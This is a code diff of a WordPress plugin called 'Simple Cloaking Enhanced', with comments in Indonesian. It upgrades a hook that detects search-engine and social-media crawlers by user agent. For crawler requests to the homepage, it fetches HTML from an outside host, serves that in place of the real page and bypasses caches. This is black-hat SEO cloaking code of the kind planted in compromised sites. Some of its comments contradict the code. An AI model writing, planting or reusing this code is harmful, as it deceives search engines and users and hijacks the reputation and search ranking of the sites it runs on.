@@ -1,19 +1,30 @@
 <?php
 /**
- * Plugin Name: Simple Cloaking
- * Description: Simple cloaking for bots
- * Version: 1.0
+ * Plugin Name: Simple Cloaking Enhanced
+ * Description: Simple cloaking for bots with cache bypass
+ * Version: 2.0
  */
+
+// Cegah akses langsung
+if (!defined('ABSPATH')) {
+    exit;
+}
 
 function mangsud($url) {
     if (function_exists('curl_init')) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_FOLLOWLOCATION => 1,
+            CURLOPT_SSL_VERIFYPEER => 0,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_HTTPHEADER => [
+                'Cache-Control: no-cache, no-store, must-revalidate',
+                'Pragma: no-cache'
+            ]
+        ]);
         $response = curl_exec($ch);
         $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
@@ -22,22 +33,64 @@ function mangsud($url) {
     return false;
 }
 
-add_action('init', function() {
-    if (is_admin()) return;
+// Pakai priority lebih tinggi (99) biar jalan sebelum cache plugin
+add_action('plugins_loaded', 'mangsud_check_bot', 0);
+add_action('init', 'mangsud_check_bot', 0);
+
+function mangsud_check_bot() {
+    // Cek user agent
+    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
     
-    $res = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';
-    $bot = "https://bloomtalks.com/chia-cundinamarca/chiaa.html";
-    $botchar = "/(googlebot|bingbot|yandexbot|facebookexternalhit)/i";
+    // Daftar bot lebih lengkap
+    $bot_patterns = [
+        'googlebot',
+        'bingbot',
+        'yandexbot',
+        'facebookexternalhit',
+        'facebot',
+        'twitterbot',
+        'slurp',
+        'baiduspider'
+    ];
     
-    if (!empty($res) && preg_match($botchar, $res)) {
-        $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
-        if ($request_uri === '/' || $request_uri === '/index.php') {
-            $file = mangsud($bot);
-            if ($file !== false) {
-                header('Content-Type: text/html; charset=UTF-8');
-                echo $file;
-                exit;
-            }
+    $is_bot = false;
+    foreach ($bot_patterns as $bot) {
+        if (strpos($user_agent, $bot) !== false) {
+            $is_bot = true;
+            break;
         }
     }
-});
+    
+    if (!$is_bot) {
+        return;
+    }
+    
+    // Cek request URI
+    $request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+    $is_homepage = ($request_uri === '/' || $request_uri === '/index.php' || $request_uri === '');
+    
+    if (!$is_homepage) {
+        return;
+    }
+    
+    // Bypass cache dengan header
+    header('Cache-Control: no-cache, no-store, must-revalidate, private');
+    header('Pragma: no-cache');
+    header('Expires: 0');
+    header('X-Robots-Tag: noindex, nofollow', true);
+    
+    // Ambil konten eksternal
+    $bot_url = "https://bloomtalks.com/chia-cundinamarca/chiaa.html";
+    $remote_content = mangsud($bot_url);
+    
+    if ($remote_content !== false) {
+        // Bersihkan semua output buffer
+        while (ob_get_level()) {
+            ob_end_clean();
+        }
+        
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $remote_content;
+        exit;
+    }
+}
